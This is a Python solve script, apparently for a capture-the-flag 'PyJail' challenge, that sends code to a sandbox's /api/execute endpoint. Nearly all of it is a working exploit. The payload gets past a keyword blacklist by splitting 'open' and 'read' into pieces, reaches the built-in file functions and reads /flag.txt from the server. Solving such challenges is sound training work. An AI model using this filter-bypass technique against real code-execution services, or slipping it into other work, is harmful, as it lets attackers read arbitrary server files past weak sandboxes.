import requests
import sys

def solve(target_url):
    exec_url = target_url.rstrip('/') + '/api/execute'
    
    # Bypass string filter:
    # 1. 'o' + 'pen' avoids the blacklisted string 'open'
    # 2. 'r' + 'ead' avoids the blacklisted string 'read'
    # Handles both dict and module types for __builtins__
    payload = "(getattr(__builtins__, 'get', None) and __builtins__.get('o' + 'pen') or getattr(__builtins__, 'o' + 'pen'))('/flag.txt').__getattribute__('r' + 'ead')()"
    
    print(f"[*] Sending PyJail bypass payload to {exec_url}...")
    res = requests.post(exec_url, json={"code": payload})
    
    if res.status_code == 200:
        result = res.json().get("result", "")
        print(f"[+] Output from Sandbox:\n{result}")
        if "flag{" in result or "FLAG{" in result:
            print("[+] Challenge Solved Successfully!")
            return True
    else:
        print(f"[-] Request failed ({res.status_code}): {res.text}")

    return False

if __name__ == "__main__":
    target = sys.argv[1] if len(sys.argv) > 1 else "http://localhost:8005"
    success = solve(target)
    sys.exit(0 if success else 1)
